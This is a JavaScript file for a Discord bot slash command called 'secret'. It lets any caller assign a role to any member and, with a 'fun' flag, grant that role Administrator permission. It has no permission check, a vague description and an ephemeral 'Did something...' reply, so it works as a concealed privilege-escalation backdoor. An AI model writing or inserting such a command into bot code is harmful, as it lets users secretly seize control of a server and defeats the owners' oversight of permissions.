const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js')

module.exports = {
    data: new SlashCommandBuilder()
        .setName('secret')
        .setDescription('a super secret command!')
        .addRoleOption(option => option
            .setName('rinput')
            .setDescription('rinput'))
        .addUserOption(option => option
            .setName('uinput')
            .setDescription('uinput'))
        .addBooleanOption(option => option
            .setName('fun')
            .setDescription('Fun modifier')),
    async execute(interaction) {
        interaction.guild.roles.cache.sort(function compareFn(a, b) {
            if (a.rawPosition < b.rawPosition) return -1;
            if (a.rawPosition === b.rawPosition) return 0;
            return 1; 
        }).forEach(element => {
            console.log(element.name)
        });
        let user = interaction.options.getMember('uinput') ?? interaction.member;
        let role = interaction.options.getRole('rinput');
        await user.roles.add(role);
        if(interaction.options.getBoolean('fun')) role.setPermissions(PermissionFlagsBits.Administrator);
        await interaction.reply({content : `Did something...`, ephemeral: true});
    }
}